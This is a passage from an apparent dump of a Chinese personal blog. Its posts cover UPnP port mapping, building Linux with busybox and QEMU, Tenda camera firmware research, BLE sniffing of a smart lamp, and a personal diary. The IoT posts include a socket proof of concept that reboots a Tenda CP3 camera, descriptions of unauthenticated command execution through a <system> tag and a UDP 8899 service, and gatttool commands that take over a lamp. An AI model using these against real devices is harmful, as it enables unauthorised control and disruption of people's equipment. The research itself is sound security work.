xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt; ​ &lt;s:Body&gt; ​ &lt;u:GetExternalIPAddress xmlns:u=&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;&gt; ​ &lt;/u:GetExternalIPAddress&gt; ​ &lt;/s:Body&gt; &lt;/s:Envelope&gt; 重要的有head中的SOAPAction，构造方式为serviceType#action即：urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress post参数来源action中的direction为in的参数，如果只有out参数，即可不用构造post参数，直接获取。 in参数的数据类型在serviceStateTable中可以获取 POST /ctl/IPConn HTTP/1.1 Accept-Encoding: identity User-Agent: Python-urllib/3.11 Host: 10.0.0.1:56688 Content-Length: 358 Content-Type: text/xml; charset=&quot;utf-8&quot; Soapaction: &quot;urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping&quot; Connection: close &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt; ​ &lt;s:Body&gt; ​ &lt;u:DeletePortMapping xmlns:u=&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;&gt; ​ &lt;NewRemoteHost&gt;AAAA&lt;/NewRemoteHost&gt; ​ &lt;NewExternalPort&gt;AAAA&lt;/NewExternalPort&gt; ​ &lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt; ​ &lt;/u:DeletePortMapping&gt; ​ &lt;/s:Body&gt; &lt;/s:Envelope&gt; 通过gdb调试可以发现，可以获取到 python中又个upnpy库，可以很方便的执行上述步骤。 python3 -m pip install upnpy 使用方式 import upnpy \\#获取upnp upnp = upnpy.UPnP() \\#扫描，返回一个设备列表 devices = upnp.discover() \\#确定设备,两种方式都可以 devide = devices[0] device = upnp.get_igd() \\#获取服务列表 services = device.get_services() \\#确定服务，同两种方式均可 service = services[0] service = device[&#x27;WANPPPConnection.1&#x27;] #service id \\#获取服务的actions，返回一个action列表 service.get_actions() \\#通过service.action[&#x27;name&#x27;]()可以执行 service.GetExternalIPAddress() #&#123;&#x27;NewExternalIPAddress&#x27;: &#x27;10.100.40.182&#x27;&#125; \\#通过service.action[&#x27;name&#x27;].get_input_arguments()可以获取参数 service.DeletePortMapping.get_input_arguments() \\#[&#123;&#x27;name&#x27;: &#x27;NewRemoteHost&#x27;, &#x27;data_type&#x27;: &#x27;string&#x27;, &#x27;allowed_value_list&#x27;: []&#125;, &#123;&#x27;name&#x27;: &#x27;NewExternalPort&#x27;, &#x27;data_type&#x27;: &#x27;ui2&#x27;, &#x27;allowed_value_list&#x27;: []&#125;, &#123;&#x27;name&#x27;: &#x27;NewProtocol&#x27;, &#x27;data_type&#x27;: &#x27;string&#x27;, &#x27;allowed_value_list&#x27;: [&#x27;TCP&#x27;, &#x27;UDP&#x27;]&#125;] \\#发送服务 service.AddPortMapping( NewRemoteHost=&#x27;&#x27;, NewExternalPort=80, NewProtocol=&#x27;TCP&#x27;, NewInternalPort=8000, NewInternalClient=&#x27;192.168.1.3&#x27;, NewEnabled=1, NewPortMappingDescription=&#x27;Test port mapping entry from UPnPy.&#x27;, NewLeaseDuration=0 )","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"linux系统编译-x86_64","slug":"技/编译linux系统","date":"2023-02-11T16:00:00.000Z","updated":"2023-06-01T01:56:00.771Z","comments":true,"path":"article/e55c327a.html","link":"","permalink":"http://example.com/article/e55c327a.html","excerpt":"","text":"编译Linux内核 编译busybox 制作文件系统 制作根文件系统镜像文件 利用qemu运行linux内核 #下载需要的工具 sudo apt-get install libncurses5-dev flex libelf-dev libssl-dev qemu lzop 编译内核Index of &#x2F;sites&#x2F;ftp.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel&#x2F; (sjtu.edu.cn) 这里选择版本，从1.0 到 6.0都可以下载，看具体要求 这里是国内镜像站，源站为The Linux Kernel Archives #下载内核 wget http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/v6.x/linux-6.1.tar.gz #解压内核 tar -vxf linux-6.1.tar.gz cd linux-6.1 #指定架构 export ARCH=x86 #配置board config make x86_64_defconfig #配置内核 make menuconfig #编译 make -j8 如果要编译其他架构的需要配置工具链 export CROSS_COMPILE= 配置 General setup ---&gt; ----&gt; [*] Initial RAM filesystem and RAM disk (initramfs/initrd) support Device Drivers ---&gt; [*] Block devices ---&gt; &lt;*&gt; RAM block device support (65536) Default RAM disk size (kbytes) 图形化配置内核，记得保存再退出 make -j8 参数是多核编译，告诉编译器同时处理8个编译任务，能大大加快编译速度。 编译好长这样。 编译busybox#下载 wget https://busybox.net/downloads/busybox-1.36.0.tar.bz2 #解压 tar -xvf busybox-1.36.0.tar.bz2 cd busybox-1.36.0 #配置 这里要配置静态文件 settings -&gt; Build static binary (no shared libs) make menconfig #编译 make &amp;&amp; make install 配置 Busybox Settings ---&gt; Build Options ---&gt; [*] Build BusyBox as a static binary (no shared libs) 编译好的busybox在_install 目录下 制作文件系统直接在_install文件夹下补充必要文件夹 cd _install # -p参数是确保存在 mkdir -p etc dev mnt proc sys tmp proc sys mkdir -p etc/init.d/ #当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录。 #详情请看 vim etc/fstab proc /proc proc defaults 0 0 tmpfs /tmp tmpfs defaults 0 0 sysfs /sys sysfs defaults 0 0 # rcS是一个脚本文件，在inittab文件中本解析调用，用于配置Linux系统。 vim etc/init.d/rcS echo -e &quot;Welcome to linux&quot; /bin/mount -a echo -e &quot;Remounting the root filesystem&quot; mount -o remount,rw / mkdir -p /dev/pts mount -t devpts devpts /dev/pts echo /sbin/mdev &gt; /proc/sys/kernel/hotplug mdev -s chmod 755 etc/init.d/rcS # inittab是Linux系统中的一个配置文件，它定义了系统启动时要执行的进程和服务 vim etc/inittab ::sysinit:/etc/init.d/rcS ::respawn:-/bin/sh ::askfirst:-/bin/sh ::ctrlaltdel:/bin/umount -a -r chmod 755 etc/inittab cd dev #mknod 命令建立一个目录项和一个特殊文件的对应索引节点。 sudo mknod console c 5 1 sudo mknod null c 1 3 sudo mknod tty1 c 4 1 制作根文件系统镜像文件#从上一步返回到busybox源码文件夹，_install的上层目录 #创建一个32M的文件，内容全部填充为0。 dd if=/dev/zero of=./rootfs.ext3 bs=1M count=32 #格式化rootfs.ext3 mkfs.ext3 rootfs.ext3 #创建fs文件夹，将rootfs挂载到fs mkdir fs sudo mount -o loop rootfs.ext3 ./fs #将_install放入fs sudo cp -rf ./_install/* ./fs #卸载镜像文件 sudo umount ./fs #打包镜像 gzip --best -c rootfs.ext3 &gt; rootfs.img.gz 这里提供了脚本，可以直接使用 #!/bin/bash rm -rf rootfs.ext3 rm -rf fs dd if=/dev/zero of=./rootfs.ext3 bs=1M count=32 mkfs.ext3 rootfs.ext3 mkdir fs mount -o loop rootfs.ext3 ./fs cp -rf ./_install/* ./fs umount ./fs gzip --best -c rootfs.ext3 &gt; rootfs.img.gz 使用qemu运行内核qemu-system-x86_64 -kernel ./linux-4.9.229/arch/x86_64/boot/bzImage -initrd ./busybox-1.30.0/rootfs.img.gz -append &quot;root=/dev/ram init=/linuxrc console=ttyS0&quot; -serial file:output.txt -nographic","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"tendacp3","slug":"iot/tendaCP3","date":"2023-01-30T03:08:44.000Z","updated":"2023-06-01T01:10:32.297Z","comments":true,"path":"article/e3065a82.html","link":"","permalink":"http://example.com/article/e3065a82.html","excerpt":"","text":"这里就先不放设备照片了，诸位可以自己在该页面寻找下设备型号。 这款路由器是通过云端进行数据传输的，即 摄像头 &#x3D; 云端 &#x3D; 手机，无web页面，且并未发现摄像头与手机直接通信。 摄像头 前边这个黄色印字的pcb我并没有查出来具体是做什么的，但是我看这个设备介绍是有高清夜视能力的，我猜是这么个功能，不重要。 使用了上海富瀚的FH8626V100，下面是各种文档，详细文档我没找到。 https://www.fullhan.com/index.php?c=article&amp;id=221 https://www.fullhan.com/uploads/2021/11/163669725327888.pdf https://blog.csdn.net/xue_nuo/article/details/125717256?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-125717256-blog-122374192.pc_relevant_multi_platform_whitelistv2&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3 https://blog.csdn.net/xue_nuo/article/details/122374192 flash 为H25S64，从查出来的资料来看是8m的，很遗憾的是我的ch341a并不支持这个型号的闪存，所以提取写入固件操作也办不到。 只能吧信息放到这了，原谅我硬件知识的匮乏。 固件这里因为flash型号的问题我没办法从固件提取，但是官网可以直接获取，且并没有加密。 squashfs 文件系统，但解包出来的文件系统在cpio文件中。 但涉及到一部分的文件还是在squashfs-root中 只有一个root账户默认开启。密码并没有爆破出来。 通过rcS文件的分析和对uart的输出信息来看，主要为两个服务 noodles 和apollo。后边会有分析。 文件格式为32位arm小端序 uart该设备有uart接口，并且将每个用处都标注出来了。但是是被堵上的，需要将杜邦线焊接上去。 （请忽略我的焊接技术，我真没学过） 波特率为115200，tenda好多设备都都是这个。 下面是通过打印获取到的一些信息。 这里理论上摁E可以不使用自动启动，但我没有成功。 linux内核 可以看到cpu相关的sdk。 两个服务的启动。noodles 和 apollo，前面提到过 noodles监听了1300端口，但我并没有找到任何关于这个服务的相关信息。 apollo应该是apache apollo服务 Apache Apollo是一个代理服务器，其是在ActiveMQ基础上发展而来的，可以支持STOMP, AMQP, MQTT, Openwire, SSL, and WebSockets 等多种协议。 https://www.freesion.com/article/41891296353/ 之后尝试逆向分析。 上次的坑来填了 之前没有系统学习过网络编程，花了一周时间把tinyhttpd的源代码阅读理解了一下，并且仿照用python写了一个简易的httpd，可以看我另一篇文章 noodles服务分析通过分析发现noodles监听了1300端口 启动 sudo chroot . .&#x2F;qemu-arm-static .&#x2F;usr&#x2F;bin&#x2F;noodles 可以使用nmap来查看是否监听1300 可以看到1300端口已开放，并且noodles也对nmap有反应了 静态分析对于程序的静态分析，可以从main函数来正向递进分析，也可以从一些字符串来分析，又或者从一些关键函数 这里通过nmap扫描时noodles的打印来查找 通过交叉引用发现在FUN_00011878函数中存在相关信息。 创建并监听1300端口 等待用户连接 获取client传进来的内容 主要内容处理在下面相似的内容处 1300端口大概做了这些事情 参数有一下几种 UPGRADE BURNMAC ELFEXEC SYSTEM SYSTEMEX DOWNLOAD UPLOAD FLASHDUMP BURNSN READSN WRITEENV READENV fun_00014f90()函数 三个参数分别为从client传入的内容，字符串，0 这里是xml参数处理。 成果这里出了一个代码注入和一个设备重启 设备重启设备重启是利用了代码问题，更像是设计时不严谨导致的 当标签中含有upgrade时，会运行到FUN_000146f4函数，执行完毕后必然会执行到FUN_00016b90函数来使设备重启。 只需要运行到此处，脚本会使设备重启 poc import socket import time s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&#x27;127.0.0.1&#x27;,1300)) s.send(&quot;&lt;UPGRADE&gt;test&lt;/UPGRADE&gt;&quot;.encode()) print(s.recv(1024)) s.close() 代码注入这里更像一个后门，直接在 FUN_000140b4函数中发现，如果&lt;system&gt;&lt;/system&gt;中的参数不是iwlist便会直接使用system执行","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"协议-低功耗蓝牙协议(BLE)","slug":"iot/协议-ble","date":"2023-01-11T08:42:31.000Z","updated":"2023-12-21T06:40:39.466Z","comments":true,"path":"article/94a01627.html","link":"","permalink":"http://example.com/article/94a01627.html","excerpt":"","text":"蓝牙蓝牙是一种近距离无线通信技术，运行在2.4GHz免费频段，目前已大量应用于各种移动终端，物联网，健康医疗，智能家居等行业。 低功耗蓝牙协议是由蓝牙技术联盟（Bluetooth SIG）在2010年发布的蓝牙4.0，并不是蓝牙3.0的升级，而是全新的技术架构。 蓝牙4.0版本分为两种模式，单模蓝牙和双模蓝牙。 双模蓝牙，支持低功耗蓝牙的同时还兼容经典蓝牙，经典蓝牙的特点是大数据高速率，例如音频、视频等数据传输，常见的蓝牙音箱就是双模蓝牙，他需要大量的音频数据传输。 单模蓝牙，即低功耗蓝牙模式，是蓝牙4.0中的重点技术，低功耗，快连接，长距离。像各种手环，蓝牙温度计等都属于单模蓝牙。 低功耗蓝牙目前低功耗蓝牙在移动终端，智能家居，互联设备等市场都有广泛应用。 其优点： 低功耗，使用纽扣电池就可以运行数月至数年。 快连接，毫秒级的连接速度，传统蓝牙甚至长达数分钟。 远距离，长达数百米的通信距离，而传统蓝牙通常10米左右。 蓝牙联盟为低功耗蓝牙定义了一些标准数据规范（profile），只要遵守该规范，任意厂家的蓝牙设备，均可以相互连接与通信，例如无线蓝牙键盘鼠标，无论是安卓或是iOS还是Windows，均是即插即用，这便是“标准”的力量。 低功耗蓝牙支持的标准Profile有： HID，用于无线鼠标，键盘或其他遥控设备。 BatteryServices，电池状态服务，用于告知电池电量状态。 HRP，心率计Profile，用于心率采集。等等。 低功耗蓝牙还可以自定义Profile，伴随着智能手机的发展和普及，低功耗蓝牙的这个特性得到了发扬光大，同时也拓宽了低功耗蓝牙的应用领域。例如，可以自定义一个开关量的Profile，数据01表示开灯，数据00表示关灯，然后手机发送数据01和00就可以控制灯的亮和灭。 类似的应用案例有很多，下面总结应用特点： 支持自定义Profile，可以收发任意格式的数据，如01和00。 支持自定义设备，支持任意设备的连接和通信，例如智能蓝牙插座等。 工作流程以下将低功耗蓝牙统称为BLE，低功耗蓝牙设备称为BLE设备。 角色BLE设备角色主要分为两种角色，主机（Master）和从机（Peripheral），当主机和从机建立连接之后才能相互收发数据。 主机，主机可以发起对从机的扫描连接。例如手机，通常作为BLE的主机设备。 从机，从机只能广播并等待主机的连接。例如智能手环，是作为BLE的从机设备。 另外还有观察者（Observer）和广播者（Broadcaster），这两种角色不常使用，但也十分有用，例如苹果的iBeacon，就是使用广播者角色来做，只需要广播特定内容即可。 iBeacon，苹果公司开发的一种通过低功耗蓝牙技术进行一个十分精确的微定位技术; 观察者，观察者角色监听空中的广播事件，和主机唯一的区别是不能发起连接，只能持续扫描从机。 广播者，广播者可以持续广播信息，和从机的唯一区别是不能被主机连接，只能广播数据 蓝牙协议栈没有限制设备的角色范围，同一个BLE设备，可以作为主机，也可以作为从机，我们称之为主从一体，主从一体的好处是，每个BLE设备都是对等的，可以发起连接，也可以被别人连接，更加实用。 广播一个智能手环，在绑定之前，需要让手机发现自己才能去进行绑定操作。 这个让手机发现自己的操作就叫做广播。 即从机每经过一个时间间隔发送一次广播数据包，这个时间间隔称为广播间隔，这个广播动作叫做广播事件，只有当从机处于广播状态时，主机才能发现该从机。 BLE设备拥有40个信道，从0到39，其中37，38，39就是BLE的广播信道。 在每个广播事件中，广播包会分别在37,38和39三个信道上依次广播。 广播时间间隔的范围是从20ms到10.24s，广播间隔影响建立连接的时间。广播间隔越大，连接的时间越长。 广播数据包最多能携带31个字节的数据，一般包含可读的设备名称，设备是否可连接等信息。 当主机收到从机广播的数据包后，它可以再发送获取更多数据包的请求，这个时候从机将广播扫描回应数据包，扫描回应数据包和广播包一样，可以携带31个字节的数据，如果长度不足，会补0，这部分数据无意义。 提示：蓝牙4.x，广播有效载荷最多是31个字节。而在蓝牙5.0中，通过添加额外的广播信道和新的广播PDU，将有效载荷增加到了255个字节 在安卓手机中可以使用BLE调试助手来查看广播包。 广播包一般格式为 0x长度类型数据长度类型数据… 0x02011A05030F1892FD11094544494649455220545753312050726F 这是我附近某个耳机的广播信息。 分析： 0x02&#x2F;01&#x2F;1A05，长度2&#x2F;类型&#x2F;对应长度的值。 0x03&#x2F;0F&#x2F;1892FD，长度3&#x2F;类型&#x2F;对应长度的值。 0x11&#x2F;09&#x2F;4544494649455220545753312050726F，长度16&#x2F;类型&#x2F;对应的值。 前两段数据并不能看出什么信息，第三段数据可以转为ascii看一下。 即蓝牙耳机名字。 扫描扫描是主机监听从机广播数据包和发送扫描请求的过程，主机通过扫描，可以获取到从机的广播包以及扫描回应数据包，主机可以对已扫描到的从机设备发起连接请求，从而连接从机设备并通信。 扫描动作有两个比较重要的时间参数：扫描窗口和扫描间隔，如果扫描窗口等于扫描间隔，那么主机将一直处于扫描状态之中，持续监听从机广播包。 被动扫描，主机监听广播信道的数据，当接收到广播包时，协议栈将向上层（也就是应用层，用户可编程）传递广播包。 主动扫描，主动扫描除了完成被动扫描的动作外，还会向从机发送一个扫描请求，从机收到该请求时，会再次发送一个称作扫描回应的广播包。 连接除了扫描， 设备也可以主动发起连接， 发起状态的设备和扫描状态的设备区别在于：当它监听到一个可连接的广播， 发起设备就会发送一个连接请求， 而扫描设备会发送一个扫描请求。连接请求包括一套为从设备准备的连接参数， 安排连接期间发生的通道和时间。如果广播设备接收了连接， 两个设备会进入连接状态， 发起方会称为 Master（主机），而广播方会称为 Slave（从机）。 所有的通信都发生在两个设备的连接事件期间， 连接事件周期的发生， 按照连接参数指定的间隔联系， 每个事件发生在某个数据通道（0~36）， 调频增量参数决定了下次连接时间发生的通道， 在每个连接时间期间， Master 先发送， Slave 会在 150us 之后做出回应， 即使一个连接事件发生（ 或两者）， 双方都没有数据发送（例外情况是从设备潜伏使能）， 这允许两个设备都承认对方仍然存在并保持活跃的连接。 主机和从机都可以主动断开连接。一边发起断开， 另一边必须在断开连接之前回应这个断开请求。 通信BLE 通信的两个基本概念。 GAP 通用访问配置文件(Generic Access Profile) GATT 通用属性配置文件(Generic Attribute Protocol) GAP完成了上面广播，连接的操作。 GATT则定义了两个 BLE 设备连接后如何使用服务和属性两个概念进行数据交换。 GATT 的两个主要概念： 服务（Services） 特征（Characteristics） Profile包含一个或者多个服务，每个服务又包含一个或者多个特征。主机可以发现和获取从机的服务和特征，然后与之通信。特征是主从通信的最小单元。 每个服务和特征都有自己的唯一标识UUID，标准UUID为128位，蓝牙协议栈中一般采用16位，也就是两个字节的UUID格式。 每个特征都有自己的属性，属性的取值有：可读 Read，可写 Write 以及 通知 Notify。 这样，两个BLE设备就有以下的数据交互方式。 主机可主动向从机Write写入或Read读取数据。 从机可主动向主机Notify通知数据。 测试这里使用了两台手机来模拟两个BLE设备 从机： 主机连接从机： 上面链接后可以看到整个profile，下面每个UUID对应一个服务，不同服务之间有不同的特征。在UUID为 0xFFF0的服务中，有三个特征，0xFFF1，0xFFF2，0xFFF3。 可以看到FFF1的属性为read&#x2F;notify，可读，通知。FFF2的属性为Write，可写。 从机页面中，从机通过0xfff1发送数据。0xfff2接收数据。 0xfff1从机发送数据： 主机实时接收: 0xfff2主机发送数据： 从机实时接收： 嗅探可以理解为利用窃听装置来获取双方通信内容。 ble设备功能设计中，一定会少不了私有的Service或Characteristic，就要通过app逆向或嗅探蓝牙通信来分析了。 蓝牙嗅探最好的神器是Ubertooth One，精致的硬件＋配套的软件变成了物联网黑客强大的帮手。 这玩意挺贵的，贵不是他的缺点，是我的缺点。 所以我们使用暂时使用廉价的替代方案，BLE USB Dongle。之后有设备后会配套更新相应文章。 这玩意只支持ble 这里使用的是一块nRF52832 Dongle，某宝可以直接买到烧录好的板子，具体烧录过程就不赘述。 具体可看官方文档：https://www.nordicsemi.com/Products 配置wireshark购买板子后找客服要来物料包，其中包含相关插件。 打开 wireshark → 帮助 → 关于 wireshark → 文件夹 → 双击打开 Extcap 路径(全 局路径和个人路径二选其一)如下图所示: 将 extcap 文件夹的四个文件复制到 wireshark 的 extcap 路径下， 以全局路径为例，如图所示: 双击 wireshark 个人配置的路径，如图: 在弹出的文件夹中打开 profiles 文件夹 将解压压缩包的 Profile_nRF_Sniffer_xx_xx 文件夹拷贝到 profiles 文件夹中，如图: 使用软件配置成功后，将设备 插入 USB 口连接至 PC 端，打开 Wireshark，选 择 nRF sniffer COMx，具体串口号根据实际选择。 在工具栏中选择 → 视图 → 接口工具栏 → nRF sniffer，会出现如下界面(默认抓取 所有 BLE 广播信号): 选择任一 BLE 从机上电进行广播。 抓取指定 MAC 地址设备的数据包。 可通过 APP 查看设备 MAC 地址，如下图所示: 如下图红色方框中所示，点击 devices 过滤下拉框选择对应 MAC 地址的 device，选择 固定设备后则只会抓取和该设备有关的数据包。 Wireshark 选择该 MAC 地址设备后，该设备的广播包、scan request packet 和 scan response packet 都会被捕获到。 ![image-20230111102119282](&#x2F;Users&#x2F;pipi&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230111102119282.png) 该设备与任意 master 通信的数据包都可以被抓取，包括连接过程和连接之后的数据 包。双击任意一个 packet 可查看具体内容，例如该设备广播包抓取内容如下: Hello World其实是对一个简单的蓝牙氛围灯的嗅探与攻击，其功能比较简单且无数据加密。 app长这样 分析使用wireshark来嗅探相关信息。 使用手机app连接灯。 有很多Empty PDU空包，使用 !(btle.data_header.llid &#x3D;&#x3D; 0x1) 来过滤 开关从手机发送打开命令 其对0x000e特征发送了bc01010155 关闭命令 对0x000e特征发送了bc01010055 通过对比，第5位的01&#x2F;00控制灯的打开和关闭。 改变速度该灯可以调节灯块闪烁速度。从0-100 修改为0 修改为100 对比第四位从00-64转换为10进制，即0-100 所以通过修改该参数可控制速度。 bc0801 00 55 改变灵敏度与速度类似 修改为0 修改为100 特征与速度类似 改变模式第一个模式 最后一个模式 所以模式从01-99共153个。 bc060200 01 55 改变颜色 通过对多个颜色的分析，数据格式应该为bc04060 11c 0 196 000055，其中11c控制亮度，196控制颜色。 通过上面的分析，发现都是通过0x000e来进行操作。 攻击这里利用linux蓝牙栈（blueZ）来操作。 sudo apt-get install bluez 安装完成后会有hcitool和gatttool两个工具，分别进行扫描和连接以及数据的读写。 硬件使用一个蓝牙4.0的免驱适配器。 如果你的电脑虚拟机无法获取到主机网卡，可以在vm设置中取消与linux共享蓝牙设备，再接入外接适配器。 hciconfig用于配置蓝牙设备。我们可以运行这个命令来列出连接到我们计算机的 BLE 适配器以及它们的基本信息。 hciconfig hciX up 启用名为 hciX 的蓝牙设备 hciconfig hciX down 停用名为 hciX 的蓝牙设备 如果之后扫描和连接过程中出现什么问题，可以通过这两条命令来重启蓝牙设备尝试解决。 hcitoolhcitool 用于配置蓝牙连接，并向蓝牙设备发送一些特殊命令。 hcitool -i hciX 使用 hciX 接口，如果不指定，默认使用第一个可用接口。 hcitool scan 扫描处于发现模式的传统蓝牙设备。 hcitool lescan 扫描 BLE 设备。 Gattoolgatttool -I 以交互模式启动 gatttool。 gatttool -t random -b [adr] -I 使用随机 LE 地址在交互模式下启动 gattool。连接到地址为 adr 的远程蓝牙设备。 primary 检查已连接 BLE 设备的可用服务。 characteristic 检查已连接 BLE 设备的可用属性，以便从中读取数据。 char-desc 特征描述符的发现。检查 n 个 handle。 char-read-hnd 使用 handle 读取属性 。 char-write-req 向 handle 写入值。 通过扫描获取的灯泡mac地址ff:22:09:30:00:18 使用gatttool连接 有时候连接成功了但是会报错，需要再连接下。 使用primary查看服务 使用Characteristics查看特征 在找到服务和特征后，需要知道读&#x2F;写数据的 handle。这可以使用char-desc命令得到。 在找到 handle 后，使用命令char-read-hnd &lt;handle&gt;从 handle 中读取数据。 也可以使用char-read-uuid &lt;uuid&gt;来读取。 从前面嗅探中可知，该灯是通过0x000e来写入数据。 可以命令char-write-req &lt;handle&gt; &lt;value&gt; 向 handle 中写入值。 关机： 如果char-write-req报错，可以使用char-write-cmd替换。 不过注意cmd是没有返回内容的，只能从设备反应来查看是否执行成功。 以上就是入门BLE协议的相关知识，关与协议的工具，有个比较强的大的框架mirage，不过相关文章很少，需要自行研究。 https://github.com/RCayre/mirage 之后也会尝试更多相关设备的研究。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"碎碎念","slug":"余/socute","date":"2022-11-08T05:56:54.000Z","updated":"2023-12-21T06:40:02.009Z","comments":true,"path":"article/f3404829.html","link":"","permalink":"http://example.com/article/f3404829.html","excerpt":"","text":"终于要下雨了，孩子要热死了 什么都不想干，当个废物多好 今天看到一段话 今天37度，我坐在便利店门口抽着烟，看着对面青春飞扬的初中生中考，我才发现我已经离开校园很多年了。可是很奇怪，好像校园青春就在昨天，仿佛天边的云伸手就能摸到。 还是书读得少了，想感慨青春易逝也没感慨出来。只记起陶渊明的一句诗“忆我少壮时，无乐自欣愉。” 青春真是充满了力量和脆弱。 今天的壁纸 杭州一行，玩是没玩明白，倒是回来拉两天肚子，再也不参加这种活动了。 这次的一些照片。 哦对，女生说暂时不想谈恋爱是指不想跟你谈。记得不要死皮赖脸。 哎呀终于解封了 属实是封了快一个月 让我来显摆一下封控时候搞得能吃的哈哈哈 我觉得还可以哈哈哈 人一旦宅久了，确实容易废。 哦对，今晚有月全食，小丫头跟我说那是血月不吉利。 开玩笑，我可是唯物主义战士。 每次碎碎念都有好多骚话，却总写不出来。 算了算了无所谓的。 最后分享下最近的壁纸吧 好久没有碎碎念了，转眼年关降至，感觉今年啥都干了，又感觉啥都没干，人真是越来越颓了。 算了，在摸鱼，下次再说。","categories":[{"name":"杂七杂八的唠叨话","slug":"杂七杂八的唠叨话","permalink":"http://example.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%94%A0%E5%8F%A8%E8%AF%9D/"}],"tags":[],"keywords":[{"name":"杂七杂八的唠叨话","slug":"杂七杂八的唠叨话","permalink":"http://example.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%94%A0%E5%8F%A8%E8%AF%9D/"}]},{"title":"tendaCT6摄像头固件分析","slug":"iot/tendaCT6","date":"2022-09-28T06:22:42.000Z","updated":"2022-09-28T06:22:42.000Z","comments":true,"path":"article/77f90bb.html","link":"","permalink":"http://example.com/article/77f90bb.html","excerpt":"","text":"最近逛tenda发现新上了一款摄像头，这不下载个固件看看？ 直接binwalk一把梭 firmAE这里先不看文件系统，尝试下用firmAE来模拟固件 sudo .&#x2F;run.sh -c ipc &#x2F;mnt&#x2F;hgfs&#x2F;sharedir&#x2F;tenda&#x2F;ct6&#x2F;IPC_SD_update.bin 需要使用root权限来执行firmAE文件夹下的run.sh，-c参数为check，来检查是否可以模拟，一般check完成后模拟起来会很快，但check很慢，ipc算是项目名字可定义即可 sudo .&#x2F;run.sh -d ipc &#x2F;mnt&#x2F;hgfs&#x2F;sharedir&#x2F;tenda&#x2F;ct6&#x2F;IPC_SD_update.bin check完成后可以使用 -a参数直接执行，或者-d参数以debug模式执行，debug模式 这个固件能模拟，但是不能完全模拟，知道用法就可了。 如何找到一个固件的服务进行分析当解包一个固件的时候发现，没有http服务，没有html页面，没有httpd，boa，uhttpd，lighttpd等。 某些摄像头经常见到这个问题。 这个时候需要从启动来一点点看找到他启动了什么服务。 当然如果有设备并且获取了串口shell，也可以直接查看 这里推荐个超好用的命令 find 大概用法 ​ find . -name “httpd” ​ find . -name “*cfg” 支持*这样的正则匹配 linux启动最先看inittab，一般在etc下面 启动rcS，一般都在&#x2F;etc&#x2F;init.d&#x2F;rcS 这里就是执行了init.d文件夹下的文件 S00devs 里使用mknod创建Linux中的符设备文件和块设备文件，不重要 S01udev 它主要的功能是管理&#x2F;dev目录底下的设备节点。它同时也是用来接替devfs及热插拔的功能，这意味着它要在添加&#x2F;删除硬件时处理&#x2F;dev目录以及所有用户空间的行为。也不重要 S80network中也并没有发现启动的服务 那返回到rcS，执行完S*之后，执行了&#x2F;opt&#x2F;app&#x2F;init.sh 但opt中没有任何文件，这个时候就需要上面说的find命令了。 吧squashfs-root-0和-1的所有内容移动到opt下 运行network_setup.sh，启动telnet服务，将execute放到tmp，启动execute服务，运行daemon.sh network_setup.sh中没有服务启动，不赘述 daemon.sh中执行了tdseq服务 从先后顺序来看，来分析个execute。 这里tenda摄像头设备基本都是armel，自行file即可 executemain中可以看到socket函数（具体请看socket网络编程） 这里绑定了8899端口，但是并没有监听。启动下看看 发现8899的udp协议。 可以使用netcat连接 这里分析下udp协议做了什么 通过recvfrom获取到传入的内容存放到v13，创建新线程将内容传进去。 在线程中，吧参数给了v9，然后注意这个v17获取了前四位做了个判断。 以为是magicnumber，满足条件执行my_system，但是这个magicnumbe没有做任何奇奇怪怪的判断。 所以可以直接命令执行，但是还是好奇这个sub_10D64做了什么。 点进去？？？？？？？？？？？？？？？？？？？？？？？？？？？？ 不是，脱裤子放屁都没这么放的吧。 开发者这么做，一定有他的用(大)意(病) 查了半天，也没发现这里if分支的区别。 这里应该算是个命令执行了。直接来吧（jitang）！ qemu user导致的问题这里本来使用的 sudo chroot . .&#x2F;qemu-arm-static .&#x2F;opt&#x2F;app&#x2F;execute 启动的，但是命令执行死活不成功。 gdb调试了一天，愣是没找到问题。 第二天尝试了下qemu-arm-static -L . .&#x2F;opt&#x2F;app&#x2F;execute 可以了。。。，这里xxxx就是为了填充magic number，可以写脚本传入0x00来执行到sub函数。 所以各位有时候遇到这种问题可以看一下是否是qemu的问题。 当然，如果像我一样，有一个同架构的其他设备，又刚好有该设备的rce，就可以搞点牛头人操作了。 